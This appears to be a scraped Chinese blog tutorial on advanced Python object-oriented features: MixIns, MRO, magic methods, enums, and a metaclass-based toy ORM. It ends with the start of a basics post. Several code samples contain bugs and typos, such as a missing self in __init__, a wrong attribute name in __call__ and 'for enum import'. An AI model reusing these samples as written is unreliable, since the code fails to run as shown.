│ │ │ │ ▼ ▼ ▼ ▼┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐│ MRun │ │ MFly │ │ BRun │ │ BFly │└─────────┘ └─────────┘ └─────────┘ └─────────┘ │ │ │ │ │ │ │ │ ▼ ▼ ▼ ▼┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐│ Dog │ │ Bat │ │ Ostrich │ │ Parrot │└─────────┘ └─────────┘ └─────────┘ └─────────┘ 在Java中采用单继承的方式，如果必须为每个种类定义一个类的话，想必定义这些类就需要一长串的代码。但是通常Java中会使用接口来解决这一问题。Python中则使用多继承： 12345678910111213141516171819202122232425262728293031class Animal(object): pass# 大类:class Mammal(Animal): passclass Bird(Animal): passclass RunnableMixIn(object): def run(self): print(&#x27;Running...&#x27;)class FlyableMixIn(object): def fly(self): print(&#x27;Flying...&#x27;) # 各种动物:class Dog(Mammal, RunnableMixIn): passclass Bat(Mammal, FlyableMixIn): passclass Parrot(Bird, FlyableMixIn): passclass Ostrich(Bird, RunnablebleMixIn): pass 其中以MixIn结尾的类的目的就是给一个类增加多个功能，这一在设计类的时候，我们优先考虑通过多重继承来组合多个MixIn的功能，而不是设计多层次复杂的继承关系。 可见MixIn在思想上有些类似java中的接口，但是具体操作和实现上有很大的区别。 那么为什么java没有多继承机制呢？ 因为采用多继承时，如果继承的两个类中有同名方法，那么调用该方法时编译器将不知道调用的是哪个父类中的方法。 那么Python中又是通过怎样的方式解决的呢？ 实验过程参考如下博客： Python多重继承排序原理 该博客通过介绍拓扑排序以及C3算法，最后经过举例验证，得出结论：python中多继承的方法访问顺序遵从拓扑序。 该博客还补充了一个概念：MRO即method resolution order 对于如下继承关系： 1234567891011121314151617181920212223242526272829#!/usr/bin/env python3# -*- coding: utf-8 -*-class A(object): def foo(self): print(&#x27;A foo&#x27;) def bar(self): print(&#x27;A bar&#x27;)class B(object): def foo(self): print(&#x27;B foo&#x27;) def bar(self): print(&#x27;B bar&#x27;)class C1(A,B): passclass C2(A,B): def bar(self): print(&#x27;C2-bar&#x27;)class D(C1,C2): passif __name__ == &#x27;__main__&#x27;: print(D.__mro__) d=D() d.foo() d.bar() 上述继承关系的图如下： 当我们调用d.foo()时，按照拓扑排序规则，解释器会先去寻找D类中是否拥有foo()方法，即在图中去掉D对应的点以及D的出边。 于是存在的点只剩下：[C1,C2,A,B,object]，其中没有入度的点为C1和C2，根据左优先原则，寻找C1中是否包含foo()方法，去掉C1点以及C1的出边。 此时存在的点只剩下：[C2,A,B,object]，其中没有入度的点为C2，寻找C2中是否包含foo()方法，去掉C2点以及C2的出边。 此时存在的点只剩下：[A,B,object]，其中没有入度的点为A，B，根据左优先原则，寻找A中是否包含foo()方法，发现包含，于是调用该方法输出A foo 调用d.bar()时，同样也是按照拓扑序进行查找，最终输出C2-bar 而第26行代码，调用了D类的__mro__方法，将直接输出解释器寻找方法的先后顺序。因此最终的测试结果为： 123(&lt;class &#x27;__main__.D&#x27;&gt;, &lt;class &#x27;__main__.C1&#x27;&gt;, &lt;class &#x27;__main__.C2&#x27;&gt;, &lt;class &#x27;__main__.A&#x27;&gt;, &lt;class &#x27;__main__.B&#x27;&gt;, &lt;class &#x27;object&#x27;&gt;)A fooC2-bar 定制类 与__slots__类似，Python还具有很多类似命名的，有特殊作用的函数以及变量。下面来积累几个 __str__ 类似Java中的toString()方法，当对某个实例进行打印时，实际上就是调用该实例的__str__方法： 123456789class Student(object): def __init__(self, name): self.name = name def __str__(self): return &#x27;Student object (name: %s)&#x27; % self.nameprint(Student(&#x27;Michael&#x27;))# Student object (name: Michael) __repr__ 用于显示对该对象的解释，即我们直接在命令行中输入对象名时显示的内容，就是通过调用对象的__repr__方法得到，通常情况下，我们会将__repr__方法与__str__方法设置为同一个： 未定义__repr__时： 123&gt;&gt;&gt; s = Student(&#x27;Michael&#x27;)&gt;&gt;&gt; s&lt;__main__.Student object at 0x109afb310&gt; 123456class Student(object): def __init__(self, name): self.name = name def __str__(self): return &#x27;Student object (name=%s)&#x27; % self.name __repr__ = __str__ 定义后： 123&gt;&gt;&gt; s = Student(&#x27;Michael&#x27;)&gt;&gt;&gt; sStudent object (name: Michael) __iter__&amp;__next__ 如果我们需要使用for...in来遍历某个对象，我们就需要实现__iter__与__next__方法。 __iter__用于返回一个迭代对象。即for n in object中的n __next__用于在循环中反复调用1中返回的迭代对象的该函数以得到下一个对象，知道遇到StopIteration错误时退出循环。 例如我们写一个可遍历的斐波那契类： 12345678910class Fib(object): def __init__(): self.a, self.b = 0, 1 def __iter__(self): return self def __next__(self): self.a, self.b = self.b, self.a + self.b if self.a &gt; 100000: raise StopIteration() return self.a 1234567891011&gt;&gt;&gt; for n in Fib():... print(n)...11235...4636875025 __getitem__ 用于对对象进行索引访问，如： 1234&gt;&gt;&gt; Fib()[5]Traceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;TypeError: &#x27;Fib&#x27; object does not support indexing 该操作实际上时调用对象的__getitem__方法，并将索引当作参数传入。当我们实现该方法后： 123456789101112131415class Fib(object): def __init__(): self.a, self.b = 0, 1 def __iter__(self): return self def __next__(self): self.a, self.b = self.b, self.a + self.b if self.a &gt; 100000: raise StopIteration() return self.a def __getitem__(self, n): a, b = 1, 1 for x in range(n): a,b = b, a + b return a 1234567891011&gt;&gt;&gt; f = Fib()&gt;&gt;&gt; f[0]1&gt;&gt;&gt; f[1]1&gt;&gt;&gt; f[5]8&gt;&gt;&gt; f[10]89&gt;&gt;&gt; f[100]573147844013817084101 但是单纯的这样写，无法支持切片操作，切片操作实际上也是调用了对象的__getitem__方法，但是传入的是slice切片对象。由于动态语言python并不具备重载的能力，我们需要函数内部通过if进行判断 12345678910111213141516171819202122232425262728class Fib(object): def __init__(): self.a, self.b = 0, 1 def __iter__(self): return self def __next__(self): self.a, self.b = self.b, self.a + self.b if self.a &gt; 100000: raise StopIteration() return self.a def __getitem__(self, n): if isinstance(n, int): # 接受int型参数 a, b = 1, 1 for x in range(n): a,b = b, a + b return a if isinstance(n, slice): # 接受slice型参数 start = n.start stop = n.stop if start is None: start = 0 a, b = 1, 1 L = [] for x in range(stop): if x &gt;= start: L.append(a) a, b = b, a + b return L 12345&gt;&gt;&gt; f = Fib()&gt;&gt;&gt; f[0:5][1, 1, 2, 3, 5]&gt;&gt;&gt; f[:10][1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89] 如上并没有对step参数和负数进行处理，实际上这些都是可以处理的。 另外，如果将对象看作是dict，那么在该方法内还需要实现对object类型的参数第处理。 此外，除了__getitem__，还有___setitem__和__delitem__方法，用于删除和修改某个元素。 因此我们可以让自己的类创建的对象与list、tuple、dict没有什么区别。这都要归功于动态语言的鸭子类型 __getattr__ 该方法当我们访问某个对象中的未定义的属性时调用： 12345678class Student(object): def __init__(self): self.name = &#x27;Michael&#x27; def __getattr__(self, attr): if attr==&#x27;score&#x27;: return 99 当调用不存在的属性时，比如score，Python解释器会试图调用__getattr__(self, 'score')来尝试获得属性，这样，我们就有机会返回score的值： 1234567&gt;&gt;&gt; s = Student()&gt;&gt;&gt; s.name&#x27;Michael&#x27;&gt;&gt;&gt; s.score99&gt;&gt;&gt; s.ageNone 当访问没有定义的属性score和age时，就会调用__getattr__函数，由于该函数中未包含对age的处理，于是返回了默认返回值None。 要让class只响应特定的几个属性，我们就要按照约定，抛出AttributeError的错误： 123456class Student(object): def __getattr__(self, attr): if attr==&#x27;age&#x27;: return lambda: 25 raise AttributeError(&#x27;\\&#x27;Student\\&#x27; object has no attribute \\&#x27;%s\\&#x27;&#x27; % attr) 返回函数也是完全可以的： 12345class Student(object): def __getattr__(self, attr): if attr==&#x27;age&#x27;: return lambda: 25 只是调用方式要变为： 12&gt;&gt;&gt; s.age()25 该方法在写SDK时运用广泛。 有时我们可能需要给每个URL对应的API都写一个方法，API一旦改动，SDK也要改，利用动态的__getattr__，我们可以写一个链式调用： 1234567891011class Chain(object): def __init__(self, path=&#x27;&#x27;): self._path = path def __getattr__(self, path): return Chain(&#x27;%s/%s&#x27; % (self._path, path)) def __str__(self): return self._path __repr__ = __str__ 这样我你们进行如下调用时，就能自由的获取各式各样的链接： 12&gt;&gt;&gt; Chain().status.user.timeline.list&#x27;/status/user/timeline/list&#x27; 每次访问未定义参数时，都会调用对象的__getattr__方法，在此方法内，我们使用传入对象的_path以及传入的参数创建一个Chain对象，并返回，这样就能与后面属性调用组合，形成链式调用。 __call__ 当我们需要直接对实例进行函数调用时，就会调用__call__函数： 123456class Student(object): def __init__(self, name): self.name = name def __call__(self): print(&#x27;My name is %s.&#x27; % self.name) 123&gt;&gt;&gt; s = Student(&#x27;Michael&#x27;)&gt;&gt;&gt; s() # self参数不要传入My name is Michael. 有了这个参数，那么完全可以把对象看成函数，把函数看成对象。 此处补充一个区分对象与函数的方法：Callable 12345678910&gt;&gt;&gt; callable(Student())True&gt;&gt;&gt; callable(max)True&gt;&gt;&gt; callable([1, 2, 3])False&gt;&gt;&gt; callable(None)False&gt;&gt;&gt; callable(&#x27;str&#x27;)False 可见，函数即“可调用”对象。 有时我们会看到一些将参数放入URL中的REST API，比如GitHub的API： 1Get /users/:user/repos 调用时，我们需要把:user替代为实际用户名，我们需要写出如下调用式： 1Chain().users(&#x27;michael&#x27;).repos 此时在之前的链式调用的基础上，我们看到中间多出来一个类似函数调用的形式，因此我们需要将其中一环变成可调用对象，就需要用到我们的__call__，我们可以这样实现： 1234567891011121314class Chain(object): def __init__(self, path=&#x27;&#x27;): self._path = path def __getattr__(self, path): return Chain(&#x27;%s/%s&#x27; % (self._path, path)) def __str__(self): return self._path def __call__(self, users): return Chain(&#x27;%s/%s&#x27; % (self.path, users)) __repr__ = __str__ 这样最外层的Chain()创建了一个对象，访问users属性，由于不存在该属性，进入__getattr__方法，并返回一个新的对象，该对象与之后的('michael')构成函数调用，于是调用该对象的__call__方法，再次返回一个新对象，最后与repos构成访问属性。最终完成链式调用。 枚举类型 与java一样，python也提供枚举类型。 引入enum类后即可创建： 123from enum import EnumMonth = Enum(&#x27;Month&#x27;, (&#x27;Jan&#x27;, &#x27;Feb&#x27;, &#x27;Mar&#x27;, &#x27;Apr&#x27;, &#x27;May&#x27;, &#x27;Jun&#x27;, &#x27;Jul&#x27;, &#x27;Aug&#x27;, &#x27;Sep&#x27;, &#x27;Oct&#x27;, &#x27;Nov&#x27;, &#x27;Dec&#x27;)) 这样我们就可以这样访问： 123456789101112131415for name,member in Month.__members__.items(): print(name, &#x27;=&gt;&#x27;, member, &#x27;,&#x27;, member.value)# Jan =&gt; Month.Jan , 1# Feb =&gt; Month.Feb , 2# Mar =&gt; Month.Mar , 3# Apr =&gt; Month.Apr , 4# May =&gt; Month.May , 5# Jun =&gt; Month.Jun , 6# Jul =&gt; Month.Jul , 7# Aug =&gt; Month.Aug , 8# Sep =&gt; Month.Sep , 9# Oct =&gt; Month.Oct , 10# Nov =&gt; Month.Nov , 11# Dec =&gt; Month.Dec , 12 其中__members__是Month中的一个特殊属性，该属性的类型是mappingproxy，具有如下特性： 123456789101112131415161718192021222324252627# 不可变映射类型,(字典)MappingProxyType # python3.3开始,types模块中引入了一个封装类名叫MappingProxyType# 如果给这个类一个映射,它会返回一个只对映射视图.# 虽然是个只读的视图,但是它是动态的,这意味着如果对原映射做出了改动,# 我们可以通过这个视图观察到,但是无法通过这个视图对原映射做出修改 #示例from types import MappingProxyType#创建一个集合index_a = &#123;&#x27;a&#x27; : &#x27;b&#x27;&#125;#创建index_a的映射视图a_proxy = MappingProxyType(index_a)print(a_proxy)a_proxy[&#x27;a&#x27;]# #不能对a_proxy视图进行修改# a_proxy[&#x27;b&#x27;] = &#x27;bb&#x27;#但是可以对原映射进行修改index_a[&#x27;b&#x27;] = &#x27;bb&#x27;print(a_proxy) # &#123;&#x27;a&#x27;: &#x27;b&#x27;&#125;# &#123;&#x27;a&#x27;: &#x27;b&#x27;, &#x27;b&#x27;: &#x27;bb&#x27;&#125; 如果需要更精确的控制枚举类型，可以用一个派生自Enum的自定义类创建： 1234567891011for enum import Enum@uniqueclass Weekday(Enum): sun = 0 Mon = 1 Tue = 2 Wed = 3 Thu = 4 Fri = 5 Sat = 6 其中装饰器@unique用以检查并保证没有重复值 这样创建的枚举类型可以用如下方式访问： 12345678910111213141516171819202122232425262728293031&gt;&gt;&gt; day1 = Weekday.Mon&gt;&gt;&gt; print(day1)Weekday.Mon&gt;&gt;&gt; print(Weekday.Tue)Weekday.Tue&gt;&gt;&gt; print(Weekday[&#x27;Tue&#x27;])Weekday.Tue&gt;&gt;&gt; print(Weekday.Tue.value)2&gt;&gt;&gt; print(day1 == Weekday.Mon)True&gt;&gt;&gt; print(day1 == Weekday.Tue)False&gt;&gt;&gt; print(Weekday(1))Weekday.Mon&gt;&gt;&gt; print(day1 == Weekday(1))True&gt;&gt;&gt; Weekday(7)Traceback (most recent call last):...ValueError: 7 is not a valid Weekday&gt;&gt;&gt; for name, member in Weekday.__members__.items():... print(name, &#x27;=&gt;&#x27;, member)...Sun =&gt; Weekday.SunMon =&gt; Weekday.MonTue =&gt; Weekday.TueWed =&gt; Weekday.WedThu =&gt; Weekday.ThuFri =&gt; Weekday.FriSat =&gt; Weekday.Sat 元类 动态语言与静态语言的差别在于函数于类的定义，动态语言并不是在编译时创建类，而是在运行时创建类。比如如下类的创建： 123class Hello(object): def hello(self, name=&#x27;world&#x27;): print(&#x27;Hello. %s.&#x27; % name) 我们可以将该类写到一个模块hello.py，再通过另一个模块来引入该模块，查看类创建的效果： 123456from hello import Helloh = Hellp()h.hello()print(type(Hello))print(type(h)) 引入模块时，python解释器就会依次执行模块中的所有语句，执行hello.py的结果就是创建了一个Hello对象。为什么说是对象呢。Hello明明是类啊。Python中，万物接对象，包括我们创建的类。我们创建的类，实际上也是type类的一个对象。 从上例的输出结果可以看出： 123Hello, world.&lt;class &#x27;type&#x27;&gt;&lt;class &#x27;hello.Hello&#x27;&gt; Hello是一个class，它的类型就是type，而h是一个实例，它的类型就是class Hello。 type()函数出了可以看到对象的类型外，还可以用于动态的创建类： 12345678def fn(self, name = &#x27;world&#x27;): print(&#x27;Hello, %s.&#x27; % name)Hello = type(&#x27;Hello&#x27;, (object,), dict(hello = fn))h = Hello()h.hello()print(type(Hello))print(type(h)) 输出结果： 123Hello, world.&lt;class &#x27;type&#x27;&gt;&lt;class &#x27;hello.Hello&#x27;&gt; 利用type()动态的创建类时，需要提供三个参数： class的名称。 继承的父类集合，需要传入tuple，注意tuple的单元素写法。 class的方法名称于函数进行绑定，此处将方法fn绑定到hello上 通过type()函数创建的类和直接写class是完全一样的，因为Python解释器遇到class定义时，仅仅是扫描一下class定义的语法，然后调用type()函数创建出class。 可见，在动态操作类这件事上，动态语言比如python比静态语言，比如java方便很多。 除了使用type外，还能使用metaclass对类的创建进行控制 metaclass metaclass直译为原类。 实例的创建可由类控制，那么类的创建则是由元类进行控制。 下面引用一个例子： 定义一个metaclass可以给我们自定义的MyList增加一个add方法： 定义ListMetaclass，按照默认习惯，metaclass的类名总是以Metaclass结尾，以便清楚地表示这是一个metaclass： 12345# metaclass是类的模板，所以必须从`type`类型派生：class ListMetaclass(type): def __new__(cls, name, bases, attrs): attrs[&#x27;add&#x27;] = lambda self, value: self.append(value) return type.__new__(cls, name, bases, attrs) 接下来我们利用这个原类，来创建我们自己的list类： 12class MyList(list, metaclass = ListMetaclass): pass 此时，在定义类时，我们指定使用ListMetaclass来定制类，传入关键字参数metaclass 此后，Python解释器在创建MyList时，要通过ListMetaclass.__new__()来创建，在此，我们可以修改类的定义，比如，加上新的方法，然后，返回修改后的定义。 __new__()方法接收到的参数依次是： 当前准备创建的类的对象 类的名字 类继承的父类集合 类方法集合 下面我们试着创建一个MyList对象： 1234&gt;&gt;&gt; L = MyList()&gt;&gt;&gt; L.add(1)&gt;&gt; L[1] 普通的list并没有add()方法。 动态的修改类的定义将在编写ORM中起到非常大的作用。 ORM——‘Object Relational Mapping’，即对象——关系映射。也即是将数据库中的一个表于一个类对应，一行与一个对象对应。 我们尝试利用metaclass来实现ORM中的保存功能： 编写底层模块的第一步，就是先把调用接口写出来。比如，使用者如果使用这个ORM框架，想定义一个User类来操作对应的数据库表User，我们期待他写出这样的代码： 1234567891011class User(Model): # 定义类的属性到列的映射： id = IntegerField(&#x27;id&#x27;) name = StringField(&#x27;username&#x27;) email = StringField(&#x27;email&#x27;) password = StringField(&#x27;password&#x27;)# 创建一个实例：u = User(id=12345, name=&#x27;Michael&#x27;, email=&#x27;test@orm.org&#x27;, password=&#x27;my-pwd&#x27;)# 保存到数据库：u.save() 其中，父类Model和属性类型StringField、IntegerField是由ORM框架提供的，剩下的方法比如save()全部由父类Model自动完成。虽然metaclass的编写会比较复杂，但ORM的使用者用起来却异常简单。 接下来我们实现Field类，负责保存数据库表的字段名和字段类型： 12345678class Field(object): def __init__(self, name, column_type): self.name = name self.column_type = column_type def __str__(self): return &#x27;&lt;%s:%s&gt;&#x27; % (self.__class__.__name__, self.name) 在此基础上，定义各种类型的子类： 123456789class StringField(Field): def __init__(self, name): super(StringField, self).__init__(name, &#x27;varchar(100)&#x27;) # 调用父类的__init__方法class IntegerField(Field): def __init__(self, name): super(IntegerField, self).__init__(name, &#x27;bigint&#x27;) 接下来编写ModelMetaclass： 12345678910111213141516class ModelMetaclass(type): def __new__(cls, name, bases, attrs): if name==&#x27;Model&#x27;: return type.__new__(cls, name, bases, attrs) print(&#x27;Found model: %s&#x27; % name) mappings = dict() for k, v in attrs.items(): if isinstance(v, Field): print(&#x27;Found mapping: %s ==&gt; %s&#x27; % (k, v)) mappings[k] = v for k in mappings.keys(): attrs.pop(k) attrs[&#x27;__mappings__&#x27;] = mappings # 保存属性和列的映射关系 attrs[&#x27;__table__&#x27;] = name # 假设表名和类名一致 return type.__new__(cls, name, bases, attrs) 使用元类ModelMetaclass创建基类Model： 12345678910111213141516171819202122232425class Model(dict, metaclass=ModelMetaclass): def __init__(self, **kw): super(Model, self).__init__(**kw) def __getattr__(self, key): try: return self[key] except KeyError: raise AttributeError(r&quot;&#x27;Model&#x27; object has no attribute &#x27;%s&#x27;&quot; % key) def __setattr__(self, key, value): self[key] = value def save(self): fields = [] params = [] args = [] for k, v in self.__mappings__.items(): fields.append(v.name) params.append(&#x27;?&#x27;) args.append(getattr(self, k, None)) sql = &#x27;insert into %s (%s) values (%s)&#x27; % (self.__table__, &#x27;,&#x27;.join(fields), &#x27;,&#x27;.join(params)) print(&#x27;SQL: %s&#x27; % sql) print(&#x27;ARGS: %s&#x27; % str(args)) 当用户定义一个class User(Model)时，Python解释器首先在当前类User的定义中查找metaclass，如果没有找到，就继续在父类Model中查找metaclass，找到了，就使用Model中定义的metaclass的ModelMetaclass来创建User类，也就是说，metaclass可以隐式地继承到子类，但子类自己却感觉不到。 在ModelMetaclass中，一共做了几件事情： 排除掉对Model类的修改； 在当前类（比如User）中查找定义的类的所有属性，如果找到一个Field属性，就把它保存到一个__mappings__的dict中，同时从类属性中删除该Field属性，否则，容易造成运行时错误（实例的属性会遮盖类的同名属性）； 把表名保存到__table__中，这里简化为表名默认为类名。 在Model类中，就可以定义各种操作数据库的方法，比如save()，delete()，find()，update等等。 使用如下代码进行测试： 12u = User(id=12345, name=&#x27;Michael&#x27;, email=&#x27;test@orm.org&#x27;, password=&#x27;my-pwd&#x27;)u.save() 输出如下： 1234567Found model: UserFound mapping: email ==&gt; &lt;StringField:email&gt;Found mapping: password ==&gt; &lt;StringField:password&gt;Found mapping: id ==&gt; &lt;IntegerField:uid&gt;Found mapping: name ==&gt; &lt;StringField:username&gt;SQL: insert into User (password,email,username,id) values (?,?,?,?)ARGS: [&#x27;my-pwd&#x27;, &#x27;test@orm.org&#x27;, &#x27;Michael&#x27;, 12345] 这样一来我们就能直接得到对应操作的SQL语句，允许即可。","categories":[{"name":"Python","slug":"Python","permalink":"http://enderxiao.github.io/categories/Python/"},{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"计算机语言","slug":"计算机语言","permalink":"http://enderxiao.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%AF%AD%E8%A8%80/"},{"name":"研究生课程基础","slug":"研究生课程基础","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F%E8%AF%BE%E7%A8%8B%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://enderxiao.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"python","slug":"python","permalink":"http://enderxiao.github.io/tags/python/"},{"name":"进阶","slug":"进阶","permalink":"http://enderxiao.github.io/tags/%E8%BF%9B%E9%98%B6/"},{"name":"面向对象","slug":"面向对象","permalink":"http://enderxiao.github.io/tags/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"name":"OOP","slug":"OOP","permalink":"http://enderxiao.github.io/tags/OOP/"}]},{"title":"python基础","slug":"python基础","date":"2021-07-14T03:20:18.000Z","updated":"2024-07-30T11:26:33.918Z","comments":true,"path":"2021/07/14/python基础/","permalink":"http://enderxiao.github.io/2021/07/14/python%E5%9F%BA%E7%A1%80/","excerpt":"python学习笔记，基础语法部分","text":"python学习笔记，基础语法部分 Into 2021年5月，我收到了来自北京工业大学的调档函，这也许意味着我研究生生活的开始。研究生最终选择了机器学习相关的方向，并且得知导师所在实验室的方向是手写体识别。 说到Machine Learning，据说大多数人使用Python进行其相关的学习与发开，Python其实之前有接触过，并且使用pyGame复刻了一版2048，可以在我的GitHub上看到： 这大概是我大一的时候写的项目了，之后比赛以及训练时都是使用自己更为熟悉的C++，因此Python逐渐变得生疏，于是就有了这篇博客。MPGA就一定会实现！ Make Python Great Again！ 参考资料 Python教程https://www.liaoxuefeng.com/wiki/1016959663602400 Get Ready！ 使用一门语言进行开发的第一步，大概是环境搭建吧。 搭建环境的方法有多种，最方便的大概使用windows的命令行，输入： 1python 如果你的电脑上尚未配置python的环境，windows自动为您打开windows引用商店，点击安装后，将自动为您修改环境变量。 此时如果再次输入python，即可编写脚本。 Python%20564b04e5895e443e982a45f45f1c78ee/Untitled.png Coding Now！ 环境搭建完成后，就该选择编辑器了，可以使用Jet Brain旗下的PyCharm，非常好用，但由于之前使用VS code进行前端开发，为了避免不必要的存储空间占用，我选择对VS Code进行一些配置，使它能够进行python开发。 首先进入python官网下载安装好VS Code，下载地址： Visual Studio Code - Code Editing. Redefinedhttps://code.visualstudio.com/ 然后，为了使VSCode更适合于python开发，我们可以利用一款名为python的插件改造我们的编辑器。 然后，新建一个文件夹作为工作区，为该工作区单独配置工作环境，通过一些必要的设置，我们将得到一个方便且强大的python编辑器。 接下来就能愉快的coding了 Python数据类型 数字 整数 python整数的表达相对自由，支持以下形式： 123a = 100 #普通整数b = 0xf #0x前缀表示16进制数c = 100_00_00 #可以使用分隔符表示较长的整数 浮点数 python中浮点数可以使用如下形式表示： 12a = 1.5 #普通浮点数b = 1.2e8 #科学计数法 字符串 python中表示字符串，可以使用单引号'或双引号&quot;。 如果使用&quot;包裹，则'不需要进行转译： 1a = &quot;I&#x27;m Iron Man&quot; 此外python还支持如下方法，使字符串全部不转译： 1a = r&quot;\\\\\\\\t\\\\\\\\&quot; #此行代码将输出\\\\\\\\t\\\\\\\\ 使用'''@'''可以输出多行内容 123456789print(&#x27;&#x27;&#x27;I&#x27;m the iron man&#x27;&#x27;&#x27;)#该代码将输出：# I&#x27;m# the# iron# man 但需要注意，python中的缩进将会被包含在内，如： 1234567891011if __name__ == &quot;__main__&quot;: a = &#x27;&#x27;&#x27;I&#x27;m the iron man&#x27;&#x27;&#x27; print(a)#该代码将输出# I&#x27;m # the # iron # man 布尔值 python中也存在bool变量，python中使用True和False（区分大小写）表示。 1a = True bool运算符使用如下方式表示 1a = True and Falseb = True or Falsec = not True 字符串 字符串编码 最开始美国人生产计算机时只考虑了美式字符和英文字母，于是创造了只有127个字符转化的ASCII 后来中国人为了适配自己的语言，创造了GB2312 日本人将日语编入Shift_JIS，韩国人将韩语编入Euc-kr 这些操作都导致字符的编码系统及其复杂。于是Unicode诞生了，Unicode编码具有以下特征： 将所有语言的字符进行整合 无论语言，通常每个字符占用2个字节，生僻字符将占用4字节 但这样又会导致新的问题，ascii中英文字符占用一个字节，但用了unicode将占用两个，这导致了传输时的带宽浪费，因此又出现了UTF-8编码。UTF-8具有如下特点： 采用不定长编码，常用字母占1字节，中文3字节，生僻字符占4-6字节。 兼容ASCII 计算机内存中为了方便操作与管理，通常采用定长的编码方式，如windows采用的UTF-16就是Unicode的一种，而当对文件进行持久化操作时，通常会为了节约空间而使用变长编码，如UTF-8。 内存中的字符集转换 同样的事也发生在网络上，为了节省带宽传输时，以及网页在显示时直接使用类似UTF-8的变长编码，而服务端则使用Unicode编码以便于管理 网络中的字符集转换 python中的字符串 在python3中，字符使用Unicode编码，可以使用如下方式使字符串及其编码进行互转，ord和chr： 12345678a = ord(&#x27;A&#x27;)# 输出a为65b = ord(&#x27;中&#x27;)# 输出b为20013c = chr(66) # 输出c为&#x27;B&#x27;d = chr(25991) # 输出d为&#x27;文&#x27; 还可以直接使用编码来表示字符： 1print(&#x27;\\u4e2d\\u6587&#x27;) # 输出&#x27;中文&#x27; pyton中的str如果需要在网络上传播或保存到磁盘上，就需要使用如下操作把str变为以字节为单位的bytes： 1a = b&#x27;ABC&#x27; # 此时每个字符将只占用一个字节 以Unicode表示的字符也可通过encode()方法编码为指定的bytes: 1234567print(&#x27;ABC&#x27;.encode(&#x27;ascii&#x27;)) # 输出b&#x27;ABC&#x27;print(&#x27;中文&#x27;.encode(&#x27;utf-8&#x27;))# 输出b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27;print(&#x27;中文&#x27;.encode(&#x27;ascii&#x27;)) # 由于使用了不支持中文的编码方式编码，本次操作将报如下异常：# UnicodeEncodeError# &#x27;ascii&#x27; codec can&#x27;t encode characters in position 0-1: ordinal not in range(128) 如果从网络或者磁盘上读出了字节流bytes也可以使用decode()将其转化为str 123456789print(b&#x27;ABC&#x27;.decode(&#x27;ascii&#x27;)) # 将输出&#x27;ABC&#x27;print(b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27;.decode(&#x27;utf-8&#x27;)) # 输出为&#x27;中文&#x27;print(b&#x27;\\xe4\\xb8\\xad\\xff&#x27;.decode(&#x27;utf-8&#x27;)) # 将会报如下异常# Traceback (most recent call last):# ...# UnicodeDecodeError: &#x27;utf-8&#x27; codec can&#x27;t decode byte 0xff in position 3: invalid start byte 如果bytes中只有一小部分无效的字节，可以传入errors='ignore'忽略错误的字节： 12print(b&#x27;\\xe4\\xb8\\xad\\xff&#x27;.decode(&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;)) # 输出&#x27;中&#x27;，utf-8无法编码的字符将被忽略 此外，对于字符串，还可以使用len()方法获取字符串的长度： 123456len(&#x27;ABC&#x27;) # 输出3，由于每个字符只占1个，因此使用len得到的就是字符串的长度len(&#x27;中文&#x27;) # 输出2len(b&#x27;\\xe4\\xb8\\xad\\xe6\\x96\\x87&#x27;)# 输出6，为占用字节长度 通常对于python文件而言，会使用如下两行注释来指定编码： 12#!/usr/bin/env python3# -*- coding: utf-8 -*- 第一行注释是为了告诉Linux/OS X系统，这是一个Python可执行程序，Windows系统会忽略这个注释； 第二行注释是为了告诉Python解释器，按照UTF-8编码读取源代码，否则，你在源代码中写的中文输出可能会有乱码。 python字符串格式化 python字符串支持使用如下方式进行格式化： 123print(&#x27;Hello, %s&#x27; % &#x27;world&#x27;) # %号后的值将会一次按类型进行替换，且无论什么类型，%s都能起作用print(&#x27;Hi, %s, you have $%d.&#x27; % (&#x27;Michael&#x27;, 1000000)) 此外还可以使用format()进行格式化： 1&#x27;Hello, &#123;0&#125;, 成绩提升了 &#123;1:.1f&#125;%&#x27;.format(&#x27;小明&#x27;, 17.125) 此外，python还支持一种格式化字符串f-string，该字符串中的{xxx}，将会被对应变量替换： 123r = 2.5s = 3.14 * r ** 2print(f&#x27;The area of a circle with radius &#123;r&#125; is &#123;s:.2f&#125;&#x27;)# The area of a circle with radius 2.5 is 19.62 占位符 替换内容 %d 整数 %f 浮点数 %s 字符串 %x 十六进制整数 空值 Python中使用None表示空值 1a = None 动态语言 python属于动态语言，赋值时不需要指定变量类型 比如，进行值交换时可以使用如下方式： 1234a = 10b = 100a, b = b, a#此处a的值为100，b为10 常量 python中通常用全大写的变量名来表示常量，如： 1PI = 3.14159265359 但是这并不意味着PI这个量就是一个无法给便的值了，只是习惯上认为这是一个常量，PI仍然是一个变量且他的值仍然能被改变。 除法 在python中，除法有两种，分别是/和//使用区别如下： 12345678a = 9/3 # 此时a的值为3.0，为浮点型b = 9//3 # 此时b的值为3，为整型c = 8/3# 此时c的值为2.6666666665，为浮点型d = 8//3 # 此时d的值为2，为整型 List Python中的list为一种有序集，具有如下特定： 支持增删 支持随机访问 下标从0开始 下标为-x时表示从后向前数的索引 123456789classmates = [&#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;]len(classmates) # 3classmates[0] # Michaelclassmates[-1] # Tracyclassmates[-2] # Bob 插入 python支持两种插入方式，分别是append和insert,前者将直接在末尾进行插入，后者支持指定位置插入： 1234classmates.append(&#x27;Adam&#x27;)classmates.insert(1,&#x27;jack&#x27;)# 结果：[&#x27;Michael&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;, &#x27;Adam&#x27;]# 结果：[&#x27;Michael&#x27;, &#x27;Jack&#x27;, &#x27;Bob&#x27;, &#x27;Tracy&#x27;, 